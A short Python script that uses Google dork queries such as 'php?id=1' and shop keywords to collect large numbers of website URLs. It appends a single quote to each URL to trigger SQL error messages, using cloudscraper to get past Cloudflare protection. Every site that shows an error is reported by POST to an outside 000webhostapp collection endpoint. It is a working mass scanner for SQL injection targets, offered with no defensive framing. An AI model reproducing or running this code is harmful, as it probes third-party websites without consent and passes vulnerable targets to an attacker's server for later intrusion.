# pip install googlesearch-python==1.0.1
import cloudscraper
import requests
scraper = cloudscraper.create_scraper()  
from time import sleep as t
from googlesearch import search
lstt = ['produce.php?id=1','index.php?id=1','produce.php?id=1','a store','clothes','Sale','Shopping stores','php?id=1']
vvc = 0
for i in lstt:
   for ur in search(i, num_results=1000000): # google => search   
      # print(ur)
      # file = open("SQL.txt","a")
      # file.write(ur+"\n")
      # file.close()
      vvc +=1
      try:
            m = scraper.get(ur+"'").text.lower()
            if 'sql' in m and 'error' in m and 'at line' in m :
               print("Dne ",ur)
               v = {"ms":ur}
               r = requests.post("https://self-assured-execut.000webhostapp.com/om/api.php",data=v)
               print(r.text)
            else:
               print('pppppppppppppp')
               print(vvc)
               pass

      except:
         print("EEEEEEEEEEEEEEEEEEEE")

    
